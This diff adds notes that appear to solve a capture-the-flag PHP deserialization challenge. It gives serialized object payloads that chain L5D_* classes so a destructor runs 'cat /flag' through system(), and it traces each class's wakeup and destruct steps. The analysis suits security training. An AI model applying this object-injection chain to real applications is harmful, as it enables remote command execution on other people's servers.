@@ -1,0 +1,40 @@
+O:10:"L5D_Upload":1:{s:1:"x";O:12:"L5D_ResetCMD":2:{S:10:"\0\\2a\0new_cmd";s:9:"cat /flag";s:1:"x";O:11:"L5D_Command":1:{s:1:"x";O:9:"L5D_Login":0:{}}}}
+OR
+O:10:"L5D_Upload":1:{s:1:"x";O:12:"L5D_ResetCMD":2:{S:10:"\0\\2a\0new_cmd";s:9:"cat /flag";s:1:"x";O:11:"L5D_Command":0:{}}}
+
+wakeup: (L5D_Login) -> L5D_Command -> L5D_ResetCMD -> L5D_Upload
+destruct: L5D_Upload -> L5D_ResetCMD -> L5D_Command -> (L5D_Login)
+
+
+Login
+	wakeup:
+		$flag = file_get_contents("/flag");
+	destruct:
+		unset($_SESSION['name']);
+		$status = "finish";
+
+Command
+	wakeup:
+		$_SESSION['name'] = randstr(14);
+		$is_upload = false;
+		$cmd = "whoami";
+	destruct
+		$status = "cmd";
+		@system($cmd);
+
+ResetCMD
+	wakeup:
+		$_SESSION['name'] = randstr(14);
+		$is_upload = false;
+	destruct
+		$status = "reset";
+		$cmd = $this->new_cmd;
+
+
+Upload
+	wakeup:
+		$cmd = "whoami";
+		$_SESSION['name'] = randstr(14);
+		$is_upload = true;
+	destruct:
+		$status = "upload_ok";
